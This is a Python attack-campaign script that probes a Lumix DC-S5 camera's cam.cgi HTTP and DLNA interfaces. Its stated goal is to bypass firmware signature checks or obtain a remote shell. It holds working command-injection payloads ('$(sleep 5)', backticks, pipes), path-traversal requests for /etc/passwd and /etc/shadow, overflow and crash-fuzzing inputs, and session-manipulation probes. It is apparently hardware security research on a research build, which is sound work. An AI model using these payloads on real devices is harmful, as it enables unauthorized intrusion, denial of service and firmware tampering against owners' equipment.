#!/usr/bin/env python3
"""
campaign.py — S5 second-wave probe campaign (Wi-Fi oracle).

Goal: find a way to BYPASS the firmware verification (version gate /
signature) or to get a SHELL (RCE) on the DC-S5 research build, purely over
the cam.cgi HTTP surface + DLNA + raw TCP. Everything is paced and health-
guarded.

Phases (default = safe A-G; H/I/J are RISKY and need --confirm):
  A  type= enumeration across all modes (incl. 48 partition names, debug words)
  B  value boundary / overflow (int parse + length + NUL)
  C  CGI parameter injection -> SHELL (timing + MARKER echo)
  D  HTTP layer (paths, methods, Server header, long params, HEAD)
  E  DLNA 60606 (SSDP, device description, SOAP, path traversal)
  F  session manipulation (req_acc variants, X-SESSION_ID, multi-session)
  G  startsenddata type enumeration (lens_fw / bootrom / program / ...)
  H  CRASH testing (long params, many params, orphan senddata, bad multipart)  [RISKY]
  I  version+1 upload (0x01C -> 3.00) : does ECDSA cover the version field?   [RISKY, upload.py]
  J  data-flip upload : 'signature fail' vs 'version fail' oracle             [RISKY, upload.py]

Usage:
  python3 campaign.py --ip 192.168.1.131 --phase A
  python3 campaign.py --ip 192.168.1.131 --phase A,B,C        # multiple
  python3 campaign.py --ip 192.168.1.131 --phase A-G          # range of safe
  python3 campaign.py --ip 192.168.1.131 --phase H --confirm  # risky
  python3 campaign.py --ip 192.168.1.131 --all               # A-G (safe only)
"""
import argparse
import re
import time
import uuid
from urllib.parse import quote

from common import Net, Reporter, Health, parse_camrply, is_generic

IP_DEFAULT = "192.168.1.131"

# 19 known production modes (from the LUMIX Sync facade)
KNOWN_MODES = [
    "getstate", "getinfo", "getsetting", "setsetting", "camctrl",
    "accctrl", "playcmd", "editcmd", "camcmd", "startstream",
    "stopstream", "getprogress", "get_content_info", "notify",
    "startsenddata", "senddata", "requestsenddata", "endsenddata",
    "abortsenddata",
]

# 48 partition names from s5_parts_v2.json (used as type= candidates,
# because the firmware update path names partitions by these exact strings)
PARTITIONS = [
    "loader1", "loader2", "loader3", "program", "storage",
    "postboot1", "postboot2", "postboot3", "postboot4", "postboot5",
    "dram_sleep", "eep_ow_a", "eep_ow_b", "eep_adj", "eep_fix",
    "eep_act_a", "eep_act_b", "history", "lens_hist", "music",
    "osdover", "osddata", "fileinfo", "ninsho_db", "koutei_kao",
    "wifi_info", "menu_save", "zboot", "dtb", "zimage",
    "rootfs1", "rootfs2", "usbcharge", "ipu_data", "ipu_code",
    "rc_data", "rc_code", "nr_data", "nr_code", "hm_c_prog",
    "hm_d_prog", "hm_c_ddr", "hm_d_ddr", "hm_d_nw", "hm_d_nw_sng",
    "hr_c_prog", "hr_d_prog", "hr_c_ddr",
]

# debug / flash / key / mem style words as type= candidates (read-only GETs)
DEBUG_TYPES = [
    "fw", "camsetting", "lens_fw", "lens", "bootrom", "rom", "boot",
    "flash", "readflash", "dumpflash", "mem", "memdump", "readmem",
    "otp", "efuse", "key", "getkey", "readkey", "keydump", "crypto",
    "aes", "secure", "eeprom", "debug", "diag", "trace", "dmesg",
    "log", "crash", "crashdump", "selftest", "sysinfo", "status",
    "info", "list", "ls", "dir", "file", "readfile", "help", "ver",
    "version", "fwver", "buildinfo", "model", "serial", "usn", "jtag",
    "uart", "swd", "raw", "hexdump", "get", "part", "partition",
    "sd", "mmc", "net", "wifi", "scan", "update", "firmware", "selfupdate",
    "env", "environ", "cmdline", "proc", "dump", "dumpall", "getlog",
    "readlog", "kernel", "klog", "syslog", "test", "ping", "echo",
]

# real type= values seen in the decompiled facade, per mode
FAKE_MODES = ["zzz_nonexistent_xyz"]

FADE_TYPES = {
    "getstate": [],
    "getinfo": ["allmenu", "capability", "curmenu", "lens", "camsetting"],
    "getsetting": ["allmenu", "capability", "curmenu", "lens"],
    "setsetting": ["allmenu", "capability", "curmenu"],
    "camctrl": ["af_ae_lock", "asst_disp", "pinch", "touch_trace",
                "fw_update_mode", "mode", "shoot", "rec", "movie",
                "release", "burst", "selftimer", "white_balance", "iso"],
    "accctrl": ["req_acc", "req_acc_can", "req_acc_g", "req_acc_close"],
    "playcmd": ["play", "stop", "pause", "prev", "next", "first", "last",
                "zoom", "slide", "view", "thumb"],
    "editcmd": ["crop", "rotate", "trim", "rename", "copy", "move",
                "delete", "create", "new"],
    "camcmd": ["shot", "shoot", "release", "focus", "zoom", "rec", "stop"],
    "startstream": ["still", "movie", "live", "raw", "preview"],
    "stopstream": [],
    "getprogress": ["fw", "camsetting", "lens_fw", "download", "upload"],
    "get_content_info": ["photo", "movie", "still", "file", "all"],
    "notify": ["state", "event", "error", "update", "ready"],
    "startsenddata": ["fw", "camsetting", "lens_fw"],
    "senddata": [],
    "requestsenddata": [],
    "endsenddata": [],
    "abortsenddata": [],
}

# value boundary / overflow candidates (Phase B). These are all non-destructive
# (a value the parser rejects or ignores). Nothing here is a write/erase/reboot.
VALUE_BOUNDS = [
    "0", "1", "-1", "65533", "65534", "65535",
    "2147483647", "2147483648", "4294967295", "4294967296",
    "0x7fffffff", "0x80000000", "0xffffffff", "0x100000000",
    "99999999999999999999",          # overflows a 64-bit parse
    "abc", "123abc", "1.5", "-0", "00",
]

# long value / long type (Phase B length probes; still read-only)
LONG_VALUE = "A" * 1024
LONG_TYPE = "A" * 512


class Campaign:
    def __init__(self, ip, rep, confirm=False):
        self.net = Net(ip)
        self.rep = rep
        self.confirm = confirm
        self.health = Health(self.net, self.rep)

    # ---------- helpers ----------
    def probe_get(self, phase, op, path, extra=None, timeout=None,
                  marker=None):
        """GET a cam.cgi command; classify the result. Returns (result,dt)."""
        st, hd, body, dt = self.net.get(path, extra=extra, timeout=timeout)
        d = parse_camrply(body)
        res = d.get("result", "") if isinstance(d, dict) else str(d)
        finding = None
        verdict = None
        low = res.lower()
        # marker echo = possible injection/reflection
        if marker and marker in body.decode("utf-8", "replace"):
            verdict = "MARKER_ECHO"
            finding = f"marker '{marker}' reflected"
        # timing anomaly (slow) = possible RCE/sleep
        baseline = getattr(self, "_baseline", 1.0)
        if dt > baseline + 3.0:
            verdict = verdict or "SLOW"
            finding = finding or f"slow {dt:.1f}s (baseline {baseline:.1f}s) -> possible command execution"
        elif not is_generic(res):
            verdict = verdict or "INTERESTING"
            finding = finding or f"non-generic response"
        elif st is None:
            verdict = "NETERR"
        self.rep.log(phase, op, d if isinstance(d, dict) else res, dt,
                     verdict=verdict, finding=finding,
                     extra={"http": st, "body": body[:300].decode("utf-8", "replace")})
        return res, dt

    # ---------- Phase A: type= enumeration ----------
    def phase_A(self, type_list=None):
        self.rep.header("A", "type= enumeration (read-only GETs)")
        self._measure_baseline()
        types = type_list or (sorted(set(PARTITIONS + DEBUG_TYPES)))
        # For each mode, try the full type list, but for modes with a known
        # facade type set, lead with those. Keep it bounded: probe each (mode,type).
        for mode in KNOWN_MODES:
            mode_types = FADE_TYPES.get(mode, [])
            # lead with facade types, then the broad list (dedup)
            seq = mode_types + [t for t in types if t not in mode_types]
            for t in seq:
                path = f"/cam.cgi?mode={mode}&type={t}"
                op = f"mode={mode} type={t}"
                self.probe_get("A", op, path)
                if not self.health.guard("A"):
                    return
        self.rep._md("Phase A complete.")

    def _measure_baseline(self):
        ts = []
        for _ in range(3):
            _, _, _, dt = self.net.get("/cam.cgi?mode=getstate", timeout=10)
            ts.append(dt)
        self._baseline = min(ts)
        self.rep._md(f"  [baseline] getstate min latency = {self._baseline:.2f}s")

    # ---------- Phase B: value boundary / overflow ----------
    def phase_B(self):
        self.rep.header("B", "value boundary / overflow (read-only)")
        if not hasattr(self, "_baseline"):
            self._measure_baseline()
        # use camctrl (a mode that takes value) + a couple of others
        for mode in ("camctrl", "setsetting", "getsetting", "getinfo"):
            t = "mode" if mode == "camctrl" else "allmenu"
            for v in VALUE_BOUNDS:
                path = f"/cam.cgi?mode={mode}&type={t}&value={quote(v)}"
                self.probe_get("B", f"mode={mode} value={v}", path)
                if not self.health.guard("B"):
                    return
            # long value (length probe, read-only)
            self.probe_get("B", f"mode={mode} value=LONG(1024)",
                           f"/cam.cgi?mode={mode}&type={t}&value={quote(LONG_VALUE)}")
            if not self.health.guard("B"):
                return
        # long type
        self.probe_get("B", "type=LONG(512)",
                       f"/cam.cgi?mode=camctrl&type={quote(LONG_TYPE)}")
        self.rep._md("Phase B complete.")

    # ---------- Phase C: CGI injection -> SHELL ----------
    def phase_C(self):
        self.rep.header("C", "CGI parameter injection (SHELL path; timing+marker)")
        if not hasattr(self, "_baseline"):
            self._measure_baseline()
        marker = "S5ORACLE_X7Q"
        # payloads are NON-destructive: only `sleep N` for timing and plain
        # markers for reflection. No rm / reboot / erase / factory-reset.
        payloads = [
            "S5ORACLE_X7Q",                 # plain marker
            "$(S5ORACLE_X7Q)",              # $(var)
            "$(sleep 5)",                   # shell -> timing
            "`sleep 5`",                    # backticks -> timing
            "x; sleep 5",                   # semicolon
            "x | sleep 5",                  # pipe
            "$(sleep 5) S5ORACLE_X7Q",      # timing + marker
            "%00",                          # NUL byte
            "' S5ORACLE_X7Q",               # quote break
            '"S5ORACLE_X7Q"',              # double quote
            "&value=9",                     # param injection
            "%24(sleep%205)",              # url-encoded $(sleep 5)
        ]
        # inject into each of the 4 params, on a benign mode
        for mode in ("camctrl", "getinfo", "getstate"):
            for pname in ("mode", "type", "value", "value2"):
                for p in payloads:
                    params = {"mode": mode, "type": "mode", "value": "0", "value2": "0"}
                    params[pname] = p
                    qs = "&".join(f"{k}={quote(str(v))}" for k, v in params.items())
                    path = f"/cam.cgi?{qs}"
                    op = f"{pname}={p!r}"
                    self.probe_get("C", op, path, marker=marker, timeout=20)
                    if not self.health.guard("C"):
                        return
        self.rep._md("Phase C complete.")

    # ---------- Phase D: HTTP layer ----------
    def phase_D(self):
        self.rep.header("D", "HTTP layer (paths, methods, fingerprint)")
        if not hasattr(self, "_baseline"):
            self._measure_baseline()
        # paths
        for path in ["/", "/index.html", "/DCIM/", "/DCIM/100PANA0/",
                     "/etc/passwd", "/etc/shadow", "/upnp/", "/rootDesc.xml",
                     "/rootdesc.xml", "/description.xml", "/dlanadata/",
                     "/cam.cgi", "/index.cgi", "/setup.cgi", "/admin/",
                     "/cgi-bin/", "/.git/", "/.env", "/debug", "/trace"]:
            self.probe_get("D", f"GET {path}", path, timeout=8)
            if not self.health.guard("D"):
                return
        # methods
        for m in ("OPTIONS", "PUT", "DELETE", "TRACE", "CONNECT", "PATCH", "HEAD"):
            st, hd, body, dt = self.net.raw(m, "/cam.cgi?mode=getstate", timeout=8)
            verdict = "INTERESTING" if (m in ("PUT", "DELETE", "TRACE") and
                                        st in (200, 204)) else None
            self.rep.log("D", f"{m} /cam.cgi", body[:120].decode("utf-8", "replace"),
                         dt, verdict=verdict,
                         finding=(f"{m} accepted (HTTP {st})" if verdict else None),
                         extra={"http": st})
            if not self.health.guard("D"):
                return
        # Server header fingerprint
        st, hd, body, dt = self.net.get("/cam.cgi?mode=getstate", timeout=8)
        srv = hd.get("Server", "")
        self.rep.log("D", "GET /cam.cgi Server-header",
                     f"Server={srv!r} headers={sorted(hd.keys())}", dt,
                     verdict="INTERESTING" if srv else None,
                     finding=f"Server={srv}" if srv else None)
        # long query (param overflow at HTTP layer, read-only)
        big = "&x=" + "A" * 4096
        self.probe_get("D", "GET /cam.cgi?mode=getstate +4KB param",
                       f"/cam.cgi?mode=getstate{big}", timeout=10)
        self.rep._md("Phase D complete.")

    # ---------- Phase E: DLNA 60606 ----------
    def phase_E(self):
        self.rep.header("E", "DLNA 60606 (SSDP, device desc, SOAP, traversal)")
        ip = self.net.ip
        # raw device description on 60606
        for path in ["/", "/rootDesc.xml", "/description.xml", "/dlanadata/",
                     "/ddd", "/Lumix/Server0/ddd", "/icon/1", "/dd.xml",
                     "/../etc/passwd", "/upnp/"]:
            st, hd, body, dt = self.net.get(path, timeout=8, extra=None)
            low = body.decode("utf-8", "replace").lower()
            verdict = None
            finding = None
            if "rootdevice" in low or "servicetype" in low or "panasonic" in low:
                verdict = "INTERESTING"
                finding = f"DLNA device description on 60606{path}"
            self.rep.log("E", f"GET 60606{path}",
                         body[:200].decode("utf-8", "replace"), dt,
                         verdict=verdict, finding=finding, extra={"http": st})
            if not self.health.guard("E"):
                return
        # SSDP M-SEARCH (UDP 1900)
        ssdp = (b"M-SEARCH * HTTP/1.1\r\n"
                b"HOST: 239.255.255.250:1900\r\n"
                b"MAN: \"ssdp:discover\"\r\n"
                b'MAX-AGE: 3\r\n'
                b"ST: urn:schemas-upnp-org:device:rootDevice:1\r\n\r\n")
        open_, reply = self.net.tcp_send("239.255.255.250", 1900, ssdp, recv=2048, timeout=4)
        # multicast via a unicast socket often doesn't work; also try direct to the camera
        open2, reply2 = self.net.tcp_send(ip, 1900, ssdp, recv=2048, timeout=4)
        self.rep.log("E", "SSDP M-SEARCH (239.255.255.250:1900)",
                     reply[:200].decode("utf-8", "replace"), 0.0,
                     finding=(f"SSDP reply: {reply[:120]!r}" if reply else None))
        self.rep.log("E", f"SSDP M-SEARCH (direct {ip}:1900)",
                     reply2[:200].decode("utf-8", "replace"), 0.0,
                     finding=(f"SSDP reply: {reply2[:120]!r}" if reply2 else None))
        # SOAP enumeration on 60606 (CDS control endpoint)
        soap = (b"POST /upnp/soap/CDS_control HTTP/1.1\r\n"
                b"Host: " + ip.encode() + b"\r\n"
                b"Content-Type: text/xml; charset=\"utf-8\"\r\n"
                b"SOAPACTION: \"urn:schemas-upnp-org:service:ContentDirectory:1#Browse\"\r\n"
                b"Connection: close\r\n\r\n"
                b"<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                b"<s:Body><u:Browse xmlns:u=\"urn:schemas-upnp-org:service:ContentDirectory:1\">"
                b"<ObjectID>0</ObjectID><BrowseFlag> BrowseDirectChildren"
                b"</BrowseFlag><Filter>*</Filter><StartingIndex>0</StartingIndex>"
                b"<RequestedCount>0</RequestedCount></u:Browse></s:Body></s:Envelope>")
        st, hd, body, dt = self.net.raw("POST", "/upnp/soap/CDS_control",
                                        data=soap, content_type="text/xml", timeout=8)
        self.rep.log("E", "SOAP Browse CDS_control",
                     body[:200].decode("utf-8", "replace"), dt,
                     verdict=("INTERESTING" if st in (200, 500) else None),
                     finding=(f"SOAP responded HTTP {st}" if st in (200, 500) else None),
                     extra={"http": st})
        self.rep._md("Phase E complete.")

    # ---------- Phase F: session manipulation ----------
    def phase_F(self):
        self.rep.header("F", "session manipulation (read-only / reversible)")
        # NOTE: req_acc CAN pop a prompt on the camera; on the research build it
        # auto-accepts. We keep this to a few variants and cancel after.
        base = "4D454930-0100-1000-8001-%012x" % uuid.getrandbits(48)
        # req_acc_g (encrypted handshake key) — read-only, returns a 32-byte key
        self.probe_get("F", "req_acc_g", "/cam.cgi?mode=accctrl&type=req_acc_g")
        # req_acc with a few UUIDs (then cancel)
        for i in range(2):
            u = "4D454930-0100-1000-8001-%012x" % uuid.getrandbits(48)
            self.probe_get("F", f"req_acc #{i} {u[:12]}...",
                           f"/cam.cgi?mode=accctrl&type=req_acc&value={u}&value2=LUMIX%20Sync")
            self.probe_get("F", "req_acc_can (cancel)", "/cam.cgi?mode=accctrl&type=req_acc_can")
            if not self.health.guard("F"):
                return
        # X-SESSION_ID random values on a read-only command
        for i in range(3):
            sid = uuid.uuid4().hex
            self.probe_get("F", f"getstate X-SESSION_ID={sid[:8]}",
                           "/cam.cgi?mode=getstate",
                           extra={"X-SESSION_ID": sid})
        # fw_update_mode version-gate probes (read-only query; NO upload)
        for v in ("V2.90", "V2.91", "V3.00", "V1.00", "V9.99"):
            self.probe_get("F", f"fw_update_mode {v}",
                           f"/cam.cgi?mode=camctrl&type=fw_update_mode&value={quote(v)}")
        if not self.health.guard("F"):
            return
        self.rep._md("Phase F complete.")

    # ---------- Phase G: startsenddata type enumeration ----------
    def phase_G(self):
        self.rep.header("G", "startsenddata type enumeration (NO data uploaded)")
        # startsenddata with a size but no follow-up senddata => the camera
        # allocates a buffer and returns method/bufsize, then we abort. This is
        # read-only-ish (it does not write anything unless we send + end).
        # We ALWAYS follow with abortsenddata to release the buffer.
        types = ["fw", "camsetting", "lens_fw", "lens", "bootrom", "rom",
                "boot", "program", "loader1", "loader2", "loader3", "zboot",
                "zimage", "rootfs1", "rootfs2", "dtb", "music", "lut",
                "lut2", "osd", "osddata", "osdover", "dram_sleep", "efuse",
                "storage", "usbcharge", "ipu_code", "rc_code", "nr_code"]
        for t in types:
            path = f"/cam.cgi?mode=startsenddata&type={t}&value=1024"
            res, dt = self.probe_get("G", f"startsenddata type={t} (size=1024)", path)
            # always abort to release the buffer
            self.probe_get("G", f"abortsenddata after {t}",
                           "/cam.cgi?mode=abortsenddata")
            if not self.health.guard("G"):
                return
        # value overflow on a known-good type
        for v in ("0", "-1", "4294967295", "99999999999999999999", "abc"):
            self.probe_get("G", f"startsenddata type=fw value={v}",
                           f"/cam.cgi?mode=startsenddata&type=fw&value={quote(v)}")
            self.probe_get("G", "abortsenddata", "/cam.cgi?mode=abortsenddata")
            if not self.health.guard("G"):
                return
        self.rep._md("Phase G complete.")

    # ---------- Phase H: CRASH testing (RISKY) ----------
    def phase_H(self):
        if not self.confirm:
            self.rep._md("Phase H is RISKY (may reboot the camera). Re-run with --confirm.")
            return
        self.rep.header("H", "CRASH testing (RISKY; camera may reboot)")
        if not hasattr(self, "_baseline"):
            self._measure_baseline()
        # long params
        for n in (1024, 4096, 16384, 65536):
            self.probe_get("H", f"value=LONG({n})",
                           f"/cam.cgi?mode=camctrl&type=mode&value={quote('A' * n)}",
                           timeout=15)
            if not self.health.guard("H", tag=f"H-{n}"):
                self.rep._md(f"  [H] camera did not recover after value=LONG({n}); stopping H.")
                return
        # many params
        many = "&".join(f"x{i}=1" for i in range(1000))
        self.probe_get("H", "1000 params", f"/cam.cgi?mode=getstate&{many}", timeout=20)
        if not self.health.guard("H", tag="H-1000p"):
            self.rep._md("  [H] camera did not recover after 1000 params; stopping H.")
            return
        # orphan senddata (no startsenddata)
        bnd = "=====" + uuid.uuid4().hex + "====="
        part = (f"--{bnd}\r\n"
                'Content-Disposition: form-data; name="filename"; filename="send"\r\n'
                "Content-Type: application/octet-stream\r\n\r\n"
                "AAAA" + f"--{bnd}--").encode()
        st, hd, body, dt = self.net.raw("POST", "/cam.cgi?mode=senddata", data=part,
                                        content_type=f"multipart/form-data; boundary={bnd}", timeout=15)
        self.rep.log("H", "orphan senddata", body[:150].decode("utf-8", "replace"), dt,
                     extra={"http": st})
        if not self.health.guard("H", tag="H-orphan"):
            self.rep._md("  [H] camera did not recover after orphan senddata; stopping H.")
            return
        # malformed multipart (bad boundary / missing CRLF)
        self.probe_get("H", "malformed GET w/ NUL", "/cam.cgi?mode=getstate%00&x=1", timeout=15)
        if not self.health.guard("H", tag="H-nul"):
            self.rep._md("  [H] camera did not recover after NUL; stopping H.")
            return
        self.rep._md("Phase H complete.")


def parse_phase_arg(s):
    """Parse 'A', 'A,B,C', 'A-G', 'all'. Returns list of phase letters."""
    if s == "all":
        return ["A", "B", "C", "D", "E", "F", "G"]
    letters = []
    for tok in s.split(","):
        tok = tok.strip()
        if "-" in tok:
            a, b = tok.split("-", 1)
            ia, ib = ord(a), ord(b)
            letters += [chr(c) for c in range(ia, ib + 1)]
        else:
            letters.append(tok)
    return letters


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default=IP_DEFAULT)
    ap.add_argument("--phase", default="A",
                    help="e.g. A, A,B,C, A-G, all (all = safe A-G)")
    ap.add_argument("--confirm", action="store_true",
                    help="allow RISKY phases (H)")
    ap.add_argument("--out-dir", default="out")
    ap.add_argument("--pace", type=float, default=0.35)
    args = ap.parse_args()

    phases = parse_phase_arg(args.phase)
    # I and J are in upload.py (they do real firmware uploads); not here.
    risky = [p for p in phases if p in ("H",)]
    if risky and not args.confirm:
        print(f"Phases {risky} are RISKY. Add --confirm to run them.")
        phases = [p for p in phases if p not in risky]
        if not phases:
            print("Nothing safe left to run. Use --confirm for H.")
            return

    rep = Reporter(args.out_dir)
    cam = Campaign(args.ip, rep, confirm=args.confirm)
    cam.net.pace = args.pace

    rep._md(f"# S5 second-wave campaign @ {time.strftime('%Y-%m-%d %H:%M:%S')} ip={args.ip}")
    rep._md(f"phases={phases} confirm={args.confirm}")

    # health pre-check
    if not cam.health.ok("start"):
        print("Camera not ok at start (getstate != ok). Abort.")
        return

    order = {p: i for i, p in enumerate("ABCDEFGH")}
    for p in sorted(phases, key=lambda x: order.get(x, 99)):
        if p == "A":
            cam.phase_A()
        elif p == "B":
            cam.phase_B()
        elif p == "C":
            cam.phase_C()
        elif p == "D":
            cam.phase_D()
        elif p == "E":
            cam.phase_E()
        elif p == "F":
            cam.phase_F()
        elif p == "G":
            cam.phase_G()
        elif p == "H":
            cam.phase_H()
        if cam.health.dead:
            print("\nCampaign aborted: camera offline.")
            break

    # summary
    rep._md("\n## SUMMARY — findings")
    if cam.rep.findings:
        for f in cam.rep.findings:
            rep._md(f"- [{f['phase']}] {f['op']} -> `{f['result']}`  {f['finding']}")
    else:
        rep._md("- (no non-generic findings)")
    print(f"\nResults in {rep.md_path} / {rep.jsonl_path}")
    print(f"Findings: {len(cam.rep.findings)}")


if __name__ == "__main__":
    main()
